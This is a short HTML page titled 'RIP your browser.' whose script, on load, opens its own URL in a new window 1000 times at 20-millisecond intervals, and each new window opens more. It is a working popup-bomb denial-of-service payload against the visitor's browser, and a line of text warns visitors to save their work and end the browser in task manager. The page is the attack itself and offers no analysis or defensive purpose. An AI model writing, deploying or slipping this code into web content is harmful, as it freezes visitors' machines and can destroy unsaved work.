<html>
<head>
RIP your browser.
</head>
<body>
<script>
var a=document.location.href;
for (var i=0;i<1000;i++){
    setTimeout('window.open(a)',i*20);
}
void(0);
</script>
<P>Make sure you have important things saved, if you need to save it, open task manager and end the browser task ASAP</p>
</body>
</html>
